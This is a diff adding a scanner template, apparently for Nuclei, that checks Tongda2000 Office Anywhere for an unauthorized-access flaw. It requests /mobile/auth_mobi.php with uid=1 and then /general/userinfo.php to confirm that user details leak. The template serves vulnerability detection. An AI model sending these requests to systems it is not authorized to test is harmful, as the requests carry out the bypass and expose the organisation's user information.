@@ -1,0 +1,36 @@
+id: tongda2000-office_anywhere-unauthorized_access
+info:
+  name: Tongda2000 Office Anywhere Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Unauthorized access vulnerability in Tongda2000 Office Anywhere allowing sensitive information disclosure.
+http:
+  - id: r0
+    method: GET
+    path:
+      - '{{BaseURL}}/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0'
+    redirects: false
+    matchers:
+      - type: status
+        status:
+          - 200
+  - id: r1
+    method: POST
+    path:
+      - '{{BaseURL}}/general/userinfo.php?UID=1'
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"dept_name":"'
+          - '"online_flag":'
+      - type: word
+        part: header
+        words:
+          - 'application/json'
